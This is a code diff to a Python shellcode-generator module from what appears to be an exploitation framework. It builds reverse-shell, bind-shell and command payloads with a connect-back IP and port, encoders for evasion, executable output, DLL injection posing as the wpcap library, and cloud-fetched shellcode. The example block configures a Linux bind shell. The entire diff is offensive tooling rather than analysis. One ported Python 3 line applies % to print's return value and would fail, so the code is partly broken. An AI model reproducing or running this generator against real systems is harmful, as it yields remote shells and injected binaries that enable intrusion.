@@ -1,18 +1,15 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-
 import os
 import sys
 import base64
-from config import CLOUD_SERVER
+
 east_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "../")
 sys.path.append(east_path)
-
+from config import CLOUD_SERVER
 from platform import system, architecture
-
-from Asm import ShellGenerator
+from ShellcodeGenerator import ShellGenerator
 from Encoders import *
-from ast import literal_eval
 from JavaShellcode import JavaShellcodes
 from PhpShellcode import PhpShellcodes
 from PythonShellcode import PythonShellcodes
@@ -46,10 +43,11 @@ class OSShellcodes:
         return
 
     def create_shellcode(self, _shellcode_type='reverse', command='calc.exe', message='', encode=None, make_exe=0,
-                         debug=0, filename="", dll_inj_funcs=[], cloud_generate=False):
+                         debug=0, filename="", dll_inj_funcs=[], cloud_generate=False, shell_args={},
+                         use_precompiled=True):
         """
         Function for create shellcode.
-        :param _shellcode_type: (string) Can be "reverse" or "message" for Linux shellcodes and "reverse", "message", "command" for Windows shellcodes.
+        :param _shellcode_type: (string) Can be "reverse" or "bind".
         :param command: (string) Command for Windows command-shellcode.
         :param message: (string) Message for "message" for message-shellcode.
         :param encode: (string) Encoder type. Can be "xor", "alphanum", "rot_13", "fnstenv" or "jumpcall". If empty shellcode will not be encoded.
@@ -63,35 +61,35 @@ class OSShellcodes:
         if cloud_generate:
             encode = 0 if encode == None else encode
             s = getCloudShell(self.OS_TARGET, self.OS_TARGET_ARCH,
-                self.BADCHARS, _shellcode_type, make_exe, encode,
-                self.CONNECTBACK_IP, self.CONNECTBACK_PORT, command)
+                              self.BADCHARS, _shellcode_type, make_exe, encode,
+                              self.CONNECTBACK_IP, self.CONNECTBACK_PORT, command)
             shellcode = s.get_shell()
             return shellcode if not make_exe else s
 
         generator = ShellGenerator(self.OS_TARGET, self.OS_TARGET_ARCH)
         shellcode, self.binary_path = generator.get_shellcode(_shellcode_type,
-                                      connectback_ip=self.CONNECTBACK_IP,
-                                      connectback_port=self.CONNECTBACK_PORT,
-                                      command=command,
-                                      message=message,
-                                      make_exe=make_exe,
-                                      debug=debug,
-                                      filename=filename,
-                                      dll_inj_funcs=dll_inj_funcs)
+                                                              connectback_ip=self.CONNECTBACK_IP,
+                                                              connectback_port=self.CONNECTBACK_PORT,
+                                                              make_exe=make_exe,
+                                                              debug=debug,
+                                                              filename=filename,
+                                                              dll_inj_funcs=dll_inj_funcs,
+                                                              shell_args=shell_args,
+                                                              use_precompiled=use_precompiled)
         if encode:
             if debug:
-                print "[] Encode shellcode is on and started"
+                print ("[] Encode shellcode is on and started")
             e = CodeEncoders(self.OS_SYSTEM, self.OS_TARGET, self.OS_TARGET_ARCH, self.BADCHARS)
             e_shellcode = e.encode_shellcode(shellcode, encode, debug)
 
             if debug:
-                print "Length of encoded shellcode: %d" % len(e_shellcode)
-                print "[] Encode shellcode finished"
+                print ("Length of encoded shellcode: %d") % len(e_shellcode)
+                print ("[] Encode shellcode finished")
             if e_shellcode:
                 shellcode = e_shellcode
         else:
             if debug:
-                print "[] Encode shellcode is off"
+                print ("[] Encode shellcode is off")
         return shellcode
 
     def get_exe_path(self):
@@ -140,10 +138,9 @@ class CrossOSShellcodes:
 
 
 class getCloudShell:
-
-    def __init__(self, os="WINDOWS", arch="32bit", badchars="", 
-type_sh="reverse", make_exe=False, encode=0, ip="127.0.0.1", port=4000, 
-command="calc.exe"):
+    def __init__(self, os="WINDOWS", arch="64bit", badchars="",
+                 type_sh="reverse", make_exe=False, encode=0, ip="127.0.0.1", port=4000,
+                 command="calc.exe"):
         # change CLOUD_SERVER in config.py
         self.cloud_server = CLOUD_SERVER
         self.make_exe = make_exe
@@ -197,29 +194,30 @@ command="calc.exe"):
 
 if __name__ == "__main__":
     # Example of generating shellcode for Linux/Windows
-    print "[] Generate shellcode started"
+    print ("[] Generate shellcode started")
 
     BADCHARS = ["\x00", "\x0a", "\x0d", "\x3b"]
 
-    os_target = Constants.OS.WINDOWS
+    os_target = Constants.OS.LINUX
     os_target_arch = Constants.OS_ARCH.X32
-    s = OSShellcodes(os_target, os_target_arch, '127.0.0.1', 4000, BADCHARS)
+    s = OSShellcodes(os_target, os_target_arch, '192.168.1.9', 4443, BADCHARS)
     dll_funcs = ["pcap_findalldevs", "pcap_close", "pcap_compile", "pcap_datalink", "pcap_datalink_val_to_description",
                  "pcap_dump", "pcap_dump_close", "pcap_dump_open", "pcap_file", "pcap_freecode", "pcap_geterr",
                  "pcap_getevent", "pcap_lib_version", "pcap_lookupdev", "pcap_lookupnet", "pcap_loop", "pcap_open_live",
                  "pcap_open_offline", "pcap_setfilter", "pcap_snapshot", "pcap_stats"]
 
-    shellcode_type = 'command'
+    shellcode_type = 'bind'
     shellcode = s.create_shellcode(
-            shellcode_type,
-            encode=0,
-            make_exe=1,
-            debug=1,
-            dll_inj_funcs=dll_funcs,
-            filename="wpcap"
+        shellcode_type,
+        encode='',
+        make_exe=1,
+        debug=1,
+        # dll_inj_funcs=dll_funcs,
+        filename=shellcode_type,
+        # use_precompiled=False
     )
-    print s.get_exe_path()
-    print "[] Generate shellcode finished"
+    # print shellcode
+    print ("[] Generate shellcode finished")
     # Example of generating jsp shellcode
     # type = Constants.ShellcodeType.JSP
     # s = CrossOSShellcodes('127.0.0.1', 4000)
